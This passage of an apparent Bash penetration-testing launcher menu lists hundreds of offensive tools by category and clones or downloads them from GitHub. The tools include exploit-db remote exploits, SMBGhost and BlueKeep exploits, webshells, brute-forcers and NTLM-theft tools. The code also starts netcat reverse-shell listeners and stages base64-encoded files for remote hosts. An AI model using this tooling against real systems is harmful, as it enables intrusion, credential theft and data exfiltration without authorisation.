	echo -ne " 534. TheNittam/RPOscanner\t\t\t538. smackerdodi/CVE-bruter\t\t\t\t546. tstillz/webshell-scan\n"
	echo -ne " 547. jofpin/fuckshell\t\t\t\t548. followboy1999/webshell-scanner\t\t\t549. emposha/Shell-Detector\n"
	echo -ne " 627. w-digital-scanner/w13scan\t\t\t641. m4ll0k/Konan\n"
	echo "$SEP"
	echo "SHELL"
	echo -ne " 70. sameera-madushan/Print-My-Shell\t\t71. flozz/p0wny-shell/shell\t\t\t\t87. rastating/slae\n"
	echo -ne " 95. TBGSecurity/splunk_shells\t\t\t281. berkgoksel/SierraTwo\t\t\t\t295. wintrmvte/Shellab\n"
	echo -ne " 348. brimstone/go-shellcode\t\t\t349. TheBinitGhimire/Web-Shells/smevk\t\t\t432. offensive-security/exploitdb/shellcodes/android\n"
	echo -ne " 433. offensive-security/exploitdb/shellcodes/linux\t\t\t\t\t\t\t434. offensive-security/exploitdb/shellcodes/linux_x86-64\n"
	echo -ne " 435. offensive-security/exploitdb/shellcodes/linux_x86\t\t\t\t\t\t\t436. offensive-security/exploitdb/shellcodes/windows\n"
	echo -ne " 437. offensive-security/exploitdb/shellcodes/windows_x86-64\t\t\t\t\t\t438. offensive-security/exploitdb/shellcodes/windows_x86\n"
	echo -ne " 654. Rover141/Shellter\n"
	echo "$SEP"
	echo "SMB"
	echo -ne " 68. m4ll0k/SMBrute\t\t\t\t58. mvelazc0/Invoke-SMBLogin/smblogin\t\t\t65. ShawnDEvans/smbmap\n"
	echo -ne " 157. 0v3rride/Enum4LinuxPy\t\t\t8. ZecOps/CVE-2020-0796-RCE-POC\t\t\t\t91. NickSanzotta/smbShakedown\n"
	echo -ne " 92. quickbreach/SMBetray\t\t\t93. aress31/smbaudit\t\t\t\t\t312. T-S-A/smbspider\n"
	echo -ne " 333. CoreSecurity/impacket/smbserver\t\t578. CiscoCXSecurity/creddump7\n"
	echo "$SEP"
	echo "SMS"
	echo -ne " 388. sharyer/GSMEvil/SmsEvil\n"
	echo "$SEP"
	echo "SMTP"
	echo -ne " 418. pentestmonkey/smtp-user-enum\t\t419. altjx/ipwn/iSMTP\t\t\t\t\t421. tango-j/SMTP-Open-Relay-Attack-Test-Tool\n"
	echo -ne " 422. crazywifi/SMTP_Relay_Phisher\t\t423. NickSanzotta/smbShakedown\t\t\t\t424. balaganeshgbhackers/Emailspoofing\n"
	echo -ne " 425. RobinMeis/MITMsmtp\t\t\t426. mikechabot/smtp-email-spoofer-py\t\t\t525. jetmore/swaks\n"
	echo "$SEP"
	echo "SNMP"
	echo -ne " 74. hatlord/snmpwn\t\t\t\t75. etingof/pysnmp\t\t\t\t\t77. InteliSecureLabs/SNMPPLUX\n"
	echo -ne " 78. cysboy/SnmpCrack\t710. LukasRypl/snmp-fuzzer\n"
	echo "$SEP"
	echo "SOCIAL MEDIA"
	echo -ne " 427. yasserjanah/ZeS0MeBr\t\t\t551. Cyb0r9/SocialBox\t\t\t\t\t642. th3unkn0n/facebash-termux\n"
	echo "$SEP"
	echo "SPOOFING"
	echo -ne " 290. initstring/evil-ssdp\t\t\t291. KALILINUXTRICKSYT/easymacchanger\t\t\t292. sbdchd/macchanger\n"
	echo "$SEP"
	echo "SQL"
	echo -ne " 159. ccpgames/sqlcmd\t\t\t\t160. sqlmapproject/sqlmap\n"
	echo -ne " 161. payloadbox/sql-injection-payload-list\t347. kayak/pypika\t\t\t\t\t713. GDSSecurity/SQLBrute\n"
	echo "$SEP"
	echo "SS7"
	echo -ne " 384. ernw/ss7MAPer\n"
	echo "$SEP"
	echo "SSH"
	echo -ne " 59. R4stl1n/SSH-Brute-Forcer\t\t\t152. matricali/brutekrag\t\t\t\t153. c0r3dump3d/osueta\n"
	echo -ne " 155. W-GOULD/ssh-user-enumeration/ssh-check-username\t\t\t\t\t\t\t156. nccgroup/ssh_user_enum/ssh_enum\n"
	echo -ne " 297. OffXec/fastssh\t\t\t\t368. Neetx/sshdodge\t\t\t\t\t369. trustedsec/meterssh\n"
	echo -ne " 370. norksec/torcrack\t\t\t\t372. aryanrtm/sshBrutal\t\t\t\t\t714. wireghoul/sploit-dev/sshfuzz\n"
	echo -ne " 738. gotr00t0day/SSHbrute\n"
	echo "$SEP"
	echo "SSL"
	echo -ne " 190. moxie0/sslstrip\t\t\t\t194. indutny/heartbleed\t\t\t\t\t195. roflcer/heartbleed-vuln/attack\n"
	echo "$SEP"
	echo "STEGANALYSIS"
	echo -ne " 270. Va5c0/Steghide-Brute-Force-Tool/steg_brute\t\t\t\t\t\t\t271. daniellerch/aletheia\n"
	echo -ne " 272. Diefunction/stegbrute\t\t\t603. Paradoxis/StegCracker\n"
	echo "$SEP"
	echo "TACACS"
	echo -ne " 187. GrrrDog/TacoTaco\n"
	echo "$SEP"
	echo "TERMUX"
	echo -ne " 615. install metasploit first method\t\t622. install metasploit second method\t\t\t624. install sudo (no rooting phone)\n"
	echo -ne " 633. TermuxHacking000/distrux\t\t\t634. TermuxHacking000/SysO-Termux\t\t\t635. TermuxHacking000/PortmapSploit\n"
	echo "$SEP"
	echo "TFTP"
	echo -ne " 719. nullsecuritynet/tftp-fuzz\n"
	echo "$SEP"
	echo "TLS"
	echo -ne " 189. GrrrDog/sni_bruter\t\t\t428. tintinweb/striptls\n"
	echo "$SEP"
	echo "TONES"
	echo -ne " 240. luickk/gan-audio-generator\t\t241. rzbrk/mfv\n"
	echo "$SEP"
	echo "TRUECRYPT"
	echo -ne " 321. lvaccaro/truecrack\n"
	echo "$SEP"
	echo "TUNNELLING"
	echo -ne " 60. yarrick/iodine\t\t\t\t61. T3rry7f/ICMPTunnel/IcmpTunnel_S\t\t\t62. blackarrowsec/pivotnacci\n"
	echo -ne " 63. rofl0r/microsocks\t66. cgrates/rpcclient\t143. sysdream/ligolo\n"
	echo "$SEP"
	echo "UPNP"
	echo -ne " 146. tenable/upnp_info\n"
	echo "$SEP"
	echo "UTILITIES"
	echo -ne " 99. Clone a Repo from GitHub\t\t\t100. Enable forlder to HttpServer\t\t\t101. listen reverse shell from Windows\n"
	echo -ne " 102. listen reverse shell from Linux\t\t103. create ssh keys in this folder\t\t\t104. Base64 for Windows (utf16)\n"
	echo -ne " 105. Base64 utf8\t\t\t\t110. create simple php shell POST request\t\t111. Dump file to escaped hex\n"
	echo -ne " 112. print a python reverse shell\t\t113. print a perl reverse shell\t\t\t\t114. print a ruby reverse shell\n"
	echo -ne " 115. print a bash reverse shell\t\t116. print a php reverse shell\t\t\t\t243. print a powershell reverse shell\n"
	echo -ne " 165. Mount cifs in folder\t\t\t203. Download informations from IMAP email account\n"
	echo -ne " 317. get all DNS info\t324. Bluetooth scanning\t334. Hydra login-attack\n"
	echo -ne " 350. dirbustering with gobuster\t\t365. Add jpg header to a php revshell\n"
	echo -ne " 366. create simple php shell GET request\t367. create simple php shell with REQUESTS\n"
	echo -ne " 389. packets capture\t\t\t\t416. try to install repository\t\t\t\t417. get email addresses (mx data)\n"
	echo -ne " 429. wipe an external device\t\t\t430. wipe a file\t\t\t\t\t431. shred a file\n"
	echo -ne " 561. get a remote file in base64 encode\t596. download all files inside a folder shared via smb or samba\n"
	echo -ne " 598. get some useful files from remote url or ip\t\t\t\t\t\t\t600. upload a shell with PUT method\n"
	echo -ne " 618. enum users with finger\t\t\t628. ssh dictionary remote attack with optional port forwarding\n"
	echo -ne " 638. get all keys set in memcached remotely\t643. get netmask infos\t\t\t\t\t649. extract tar.gz file\n"
	echo -ne " 652. get docker version from IP\t\t669. analyze an executable file with strace and ltrace\n"
	echo -ne " 739. install tor from torproject siteweb\t740. install tor via apt-transport-tor\n"
	echo "$SEP"
	echo "VIRTUAL COINS - CURRENCIES"
	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
	echo "$SEP"
	echo "VOIP"
	echo -ne " 461. haasosaurus/ace-voip\t\t\t629. voipmonitor/sniffer\n"
	echo "$SEP"
	echo "VPN"
	echo -ne " 595. 7Elements/Fortigate\n"
	echo "$SEP"
	echo "WEBAPP"
	echo -ne " 96. m4ll0k/WPSeku\t\t\t\t97. swisskyrepo/Wordpresscan\t\t\t\t98. RamadhanAmizudin/Wordpress-scanner\n"
	echo -ne " 122. rezasp/joomscan\t\t\t\t123. rastating/joomlavs\t\t\t\t\t124. RedVirus0/BlackDir-Framework\n"
	echo -ne " 198. wpscanteam/wpscan\t\t\t\t200. 04x/WpscaN/ICgWpScaNNer\n"
	echo -ne " 201. The404Hacking/wpscan\t\t\t202. drego85/JoomlaScan\t\t\t\t\t287. boku7/LibreHealth-authRCE\n"
	echo -ne " 466. FortyNorthSecurity/EyeWitness\t\t614. dariusztytko/jwt-key-id-injector\n"
	echo -ne " 621. s0md3v/Arjun\n"
	echo "$SEP"
	echo "WEBCAMS"
	echo -ne " 395. JettChenT/scan-for-webcams\t\t396. entynetproject/entropy\t\t\t\t397. indexnotfound404/spycam\n"
	echo -ne " 471. jimywork/shodanwave\t\t\t479. SuperBuker/CamHell\t\t\t\t\t564. vanhienfs/saycheese\n"
	echo "$SEP"
	echo "WEBSHELL"
	echo -ne " 562. tennc/webshell\t\t\t\t574. epinna/weevely3\t\t\t\t\t608. jackrendor/cookiedoor\n"
	echo "$SEP"
	echo "WIFI"
	echo -ne " 540. blunderbuss-wctf/wacker\t\t\t550. calebmadrigal/trackerjacker\t\t\t580. JPaulMora/Pyrit\n"
	echo -ne " 591. hash3liZer/WiFiBroot\t\t\t592. SValkanov/wifivoid\n"
	echo "$SEP"
	echo "WINRM"
	echo -ne " 42. Hackplayers/evil-winrm\n"
	echo "$SEP"
	echo "WORDLIST"
	echo -ne " 51. danielmiessler/SecLists\t\t\t53. dariusztytko/words-scraper\t\t\t\t245. LandGrey/pydictor\n"
	echo -ne " 542. digininja/CeWL\n"
	echo -ne " 302. duyet/bruteforce-database\t\t\t318. digininja/pipal\t\t\t\t\t535. nil0x42/cracking-utils\n"
	echo "$SEP"
	echo "WORDPRESS"
	echo -ne " 468. n00py/WPForce\t\t\t\t469. BlackXploits/WPBrute\t\t\t\t566. 0xAbdullah/0xWPBF\n"
	echo -ne " 655. Moham3dRiahi/WPGrabInfo\t\t\t667. ShayanDeveloper/WordPress-Hacker\n"
	echo -ne " 668. Jamalc0m/wphunter\t\t\t\t199. MrCl0wnLab/afdWordpress\n"
	echo "$SEP"
	echo "XSS - XPATH"
	echo -ne " 55. hahwul/dalfox\t\t\t\t164. s0md3v/XSStrike\t\t\t\t\t44. lc/gau\n"
	echo -ne " 176. sullo/nikto\t\t\t\t180. faizann24/XssPy\n"
	echo -ne " 181. secdec/xssmap\t\t\t\t182. gbrindisi/xsssniper\t\t\t\t183. pwn0sec/PwnXSS\n"
	echo -ne " 184. lwzSoviet/NoXss\t\t\t\t394. Jewel591/xssmap\t\t\t\t\t558. dwisiswant0/findom-xss\n"
	echo -ne " 620. hahwul/XSpear\t\t\t\t623. r0oth3x49/Xpath\n"
	echo "$SEP"
	echo "ZIP"
	echo -ne " 43. The404Hacking/ZIP-Password-BruteForcer\t237. mnismt/CompressedCrack\n"
	echo "$SEP"
	echo "?"
	echo -ne " 36. SigPloiter/HLR-Lookups\t\t\t37. i3visio/osrframework\t\t\t\t38. secdev/scapy\n"
	echo -ne " 39. vanhauser-thc/thc-ipv6\t\t\t225. idapython/src\t\t\t\t\t226. erocarrera/pefile\n"
	echo -ne " 325. projectdiscovery/httpx\n"
	echo "$SEP"

	read -p "Choose a script: " SCELTA
	case "$SCELTA" in
	"0")
		exit 0
	;;
	"1")
		Clona "CasperGN/ActiveDirectoryEnumeration"
	;;
	"2")
		Clona "dirkjanm/ldapdomaindump"
	;;
	"3")
		Clona "ropnop/kerbrute"
	;;
	"4")
		Clona "ropnop/windapsearch"
	;;
	"5")
		Clona "CroweCybersecurity/ad-ldap-enum"
	;;
	"6")
		Clona "proabiral/inception"
	;;
	"7")
		Clona "dark-warlord14/ffufplus"
	;;
	"8")
		Clona "ZecOps/CVE-2020-0796-RCE-POC"
	;;
	"10")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""linux/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""linux/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""linux/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/linux/remote/$NOMEFL"
			fi
		fi
	;;
	"11")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""linux_x86-64/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""linux_x86-64/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86-64/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86-64/remote"| grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux_x86-64/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/linux_x86-64/remote/$NOMEFL"
			fi
		fi
	;;
	"12")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""linux_x86/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""linux_x86/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""linux_x86/remote"| grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/linux_x86/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/linux_x86/remote/$NOMEFL"
			fi
		fi
	;;
	"13")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""windows/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/windows/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/windows/remote/$NOMEFL"
			fi
		fi
	;;
	"14")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows_x86/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""windows_x86/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/windows_x86/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/windows_x86/remote/$NOMEFL"
			fi
		fi
	;;
	"15")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows_x86-64/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""windows_x86-64/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/windows_x86-64/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/windows_x86-64/remote/$NOMEFL"
			fi
		fi
	;;
	"16")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="sundaysec/Android-Exploits/"
			MEX="master/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/master/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/sundaysec/Android-Exploits/tree/master/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""sundaysec/Android-Exploits/master/remote/$NOMEFL"
			fi
		fi
	;;
	"17")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""android/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""android/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""android/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""android/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/android/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/android/remote/$NOMEFL"
			fi
		fi
	;;
	"18")
		if [[ -f $(which lynx) ]];
		then
			OFFSEC="offensive-security/exploitdb/"
			MEX="master/exploits/"
			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""ios/remote/"
			ENTTO="$ENTRAW""$OFFSEC""$MEX""ios/remote/"
			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote"
			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
			do
				if [[ "$EXP" != "" ]];
				then
					Scarica "$ENTTO""$EXP"
				fi
				break
			done
		else
			echo "Digit a file name from https://github.com/offensive-security/exploitdb/tree/master/exploits/ios/remote with extension"
			read -p "(example exploit.py): " NOMEFL
			if [[ "$NOMEFL" != "" ]];
			then
				Scarica "$ENTRAW""offensive-security/exploitdb/master/exploits/ios/remote/$NOMEFL"
			fi
		fi
	;;
	"20")
		echo "Digit a trustedsec repository name from https://github.com/trustedsec"
		read -p "(example unicorn): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Clona "trustedsec/$NOMEFL"
		fi
	;;
	"21")
		echo "Digit a Hood3dRob1n repository name from https://github.com/Hood3dRob1n"
		read -p "(example BinGoo): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			Clona "Hood3dRob1n/$NOMEFL"
		fi
	;;
	"22")
		Clona "0x09AL/IIS-Raid"
	;;
	"23")
		Clona "thelinuxchoice/evilreg"
	;;
	"24")
		Clona "thelinuxchoice/eviloffice"
	;;
	"25")
		Clona "thelinuxchoice/evildll"
	;;
	"26")
		Clona "TarlogicSecurity/kerbrute"
	;;
	"27")
		Clona "Greenwolf/Spray"
	;;
	"28")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "bfaure/AES-128_Cracker"
		fi
	;;
	"29")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "unicornsasfuel/keybrute"
		fi
	;;
	"30")
		Clona "m57/dnsteal"
	;;
	"31")
		Clona "skelsec/jackdaw"
	;;
	"32")
		Clona "dirkjanm/ROADtools"
	;;
	"33")
		Clona "fox-it/BloodHound.py"
	;;
	"34")
		Clona "devanshbatham/ParamSpider"
	;;
	"35")
		Clona "projectdiscovery/dnsprobe"
	;;
	"36")
		Scarica "$ENTRAW""SigPloiter/HLR-Lookups/master/hlr-lookups.py"
	;;
	"37")
		Clona "i3visio/osrframework"
	;;
	"38")
		Clona "secdev/scapy"
	;;
	"39")
		Clona "vanhauser-thc/thc-ipv6"
	;;
	"40")
		Clona "SecureAuthCorp/impacket"
	;;
	"41")
		Clona "shmilylty/cheetah"
	;;
	"42")
		Clona "Hackplayers/evil-winrm"
	;;
	"43")
		Scarica "$ENTRAW""The404Hacking/ZIP-Password-BruteForcer/master/ZIP-Password-BruteForcer.py"
		Scarica "$ENTRAW""The404Hacking/ZIP-Password-BruteForcer/master/pass.txt"
	;;
	"44")
		Clona "lc/gau"
		wget --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
	;;
	"45")
		Clona "porterhau5/BloodHound-Owned"
	;;
	"46")
		Clona "thelinuxchoice/evilpdf"
	;;
	"47")
		Clona "robins/pdfcrack"
	;;
	"48")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""BroadbentT/PDF-CRACKER/master/pdf-cracker.py"
		fi
	;;
	"49")
		Scarica "$ENTRAW""Greenwolf/ntlm_theft/master/ntlm_theft.py"
		pip3 install xlsxwriter
	;;
	"50")
		Clona "fuzzdb-project/fuzzdb"
	;;
	"51")
		Clona "danielmiessler/SecLists"
	;;
	"52")
		Clona "tismayil/ohmybackup"
	;;
	"53")
		Clona "dariusztytko/words-scraper"
	;;
	"54")
		Clona "aboul3la/Sublist3r"
	;;
	"55")
		Clona "hahwul/dalfox"
	;;
	"56")
		Clona "jtpereyda/boofuzz"
	;;
	"57")
		Clona "Ganapati/RsaCtfTool"
	;;
	"58")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""mvelazc0/Invoke-SMBLogin/master/smblogin.py"
		fi
	;;
	"59")
		Clona "R4stl1n/SSH-Brute-Forcer"
	;;
	"60")
		Clona "yarrick/iodine"
	;;
	"61")
		Scarica "$ENTRAW""T3rry7f/ICMPTunnel/master/IcmpTunnel_S.py"
	;;
	"62")
		Clona "blackarrowsec/pivotnacci"
	;;
	"63")
		Clona "rofl0r/microsocks"
	;;
	"64")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""dinigalab/ldapsearch/master/ldapsearch.py"
		fi
	;;
	"65")
		Clona "ShawnDEvans/smbmap"
	;;
	"66")
		if [[ $(Warning) == "Y" ]];
		then
			Clona "cgrates/rpcclient"
		fi
	;;
	"67")
		Clona "byt3bl33d3r/CrackMapExec"
	;;
	"68")
		git clone https://github.com/m4ll0k/SMBrute.git smbrute
		if [[ $(id -u) -eq 0 ]];
		then
			echo "Do you want install pysmb humanfriendly python modules?"
			read -p "Y/n (default n): " REQ
			if [[ "$REQ" == "Y" ]];
			then
				pip3 install pysmb humanfriendly
			fi
		else
			echo "sudo pip3 install pysmb humanfriendly"
		fi
	;;
	"69")
		Clona "zweisamkeit/RSHack"
	;;
	"70")
		Clona "sameera-madushan/Print-My-Shell"
	;;
	"71")
		Scarica "$ENTRAW""flozz/p0wny-shell/master/shell.php"
	;;
	"72")
		Scarica "$ENTRAW""corelan/mona/master/mona.py"
	;;
	"73")
		Clona "OpenRCE/sulley"
	;;
	"74")
		Clona "hatlord/snmpwn"
	;;
	"75")
		Clona "etingof/pysnmp"
	;;
	"77")
		Clona "InteliSecureLabs/SNMPPLUX"
	;;
	"78")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""cysboy/SnmpCrack/master/SnmpCrack.py"
		fi
	;;
	"79")
		Clona "pablocelayes/rsa-wiener-attack"
	;;
	"80")
		Clona "magnumripper/JohnTheRipper"
	;;
	"81")
		echo "Digit a file name from https://github.com/truongkma/ctf-tools/tree/master/John/run"
		read -p "(example aix2john.pl):" FILENAME
		if [[ "$FILENAME" != "" ]];
		then
			Scarica "$ENTRAW""truongkma/ctf-tools/master/John/run/""$FILENAME"
		fi
	;;
	"82")
		Clona "SySS-Research/Seth"
	;;
	"83")
		Clona "s0md3v/Hash-Buster"
	;;
	"84")
		if [[ $(Warning) == "Y" ]];
		then
			Scarica "$ENTRAW""3rdDegree/dapper/master/dapper.py"
		fi
	;;
	"85")
		Clona "m8r0wn/ldap_search"
	;;
	"86")
		sudo apt install python python-dev python-setuptools python-pip openssl openssl-dev git
		Clona "ekultek/bluekeep"
		pip install -r bluekeep/requirements.txt
	;;
	"87")
		Clona "rastating/slae"
	;;
	"88")
		Scarica "$ENTRAW""m57/dnsteal/master/dnsteal.py"
	;;
	"89")
		Clona "urbanadventurer/WhatWeb"
	;;
	"90")
		echo "Digit a file name from https://github.com/jivoi/pentest/tree/master/tools"
		read -p "(example crack_md5.py):" FILENAME
		if [[ "$FILENAME" != "" ]];
		then
			Scarica "$ENTRAW""jivoi/pentest/master/tools/""$FILENAME"
		fi
	;;
	"91")
		Scarica "$ENTRAW""NickSanzotta/smbShakedown/master/smbShakedown.py"
	;;
	"92")
		Clona "quickbreach/SMBetray"
	;;
	"93")
		Scarica "$ENTRAW""aress31/smbaudit/master/smbaudit.sh"
	;;
	"94")
		Scarica "$ENTRAW""samhaxr/recox/master/recox.sh"
	;;
	"95")
		Clona "TBGSecurity/splunk_shells"
	;;
	"96")
		Clona "m4ll0k/WPSeku"
	;;
	"97")
		Clona "swisskyrepo/Wordpresscan"
	;;
	"98")
		Clona "RamadhanAmizudin/Wordpress-scanner"
	;;
	"99")
		read -p "Digit a Git name (example https://github.com/examplename/example.git): " NOMEFL
		if [[ "$NOMEFL" != "" ]];
		then
			git clone "$NOMEFL"
		fi
	;;
	"100")
		python3 -m http.server
	;;
	"101")
		read -p "digit a number of port for the remote Windows Reverse Shell: " PORTA
		if [[ "$PORTA" =~ ^[0-9]+$ ]];
		then
			echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
			rlwrap nc -lvnp $PORTA
		fi
	;;
	"102")
		read -p "digit a number of port for the remote Linux Reverse Shell: " PORTA
		if [[ "$PORTA" =~ ^[0-9]+$ ]];
		then
			echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
			echo "after connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo'"
			nc -lvnp $PORTA
		fi
	;;
	"103")
		read -p "digit a favourite id_rsa filename (optional): " UTENTE
		if [[ "$UTENTE" != "" ]];
		then
			UTENTE="_$UTENTE"
		fi
		ssh-keygen -t rsa -b 2048 -f id_rsa"$UTENTE"
	;;
	"104")
		read -p "Digit a complete path of file to encode to utf16 base64: " FILEPATH
		if [[ "$FILEPATH" != "" ]];
		then
			if [[ -f "$FILEPATH" ]];
			then
				BSF=$(iconv -f UTF-8 -t UTF-16LE "$FILEPATH" | base64 -w 0)
				echo "$BSF"
				echo "$BSF" | xclip -selection clipboard
				echo -ne "\ncopied to clipboard\npaste to winallenum in remote machine\n"
				read
			else
				echo "$FILEPATH"" does not exist"
			fi
		else
			echo "file path is empty"
		fi
	;;
	"105")
		read -p "Digit a complete path of file to encode to utf8 base64: " FILEPATH
		if [[ "$FILEPATH" != "" ]];
		then
			if [[ -f "$FILEPATH" ]];
			then
				BSF=$(base64 "$FILEPATH" -w 0)
				echo "echo -n \"$BSF\" | base64 -d > script"
				echo "$BSF" | xclip -selection clipboard
				echo -ne "\ncopied to clipboard\npaste to linuxallenum in remote machine\n"
				read
			else
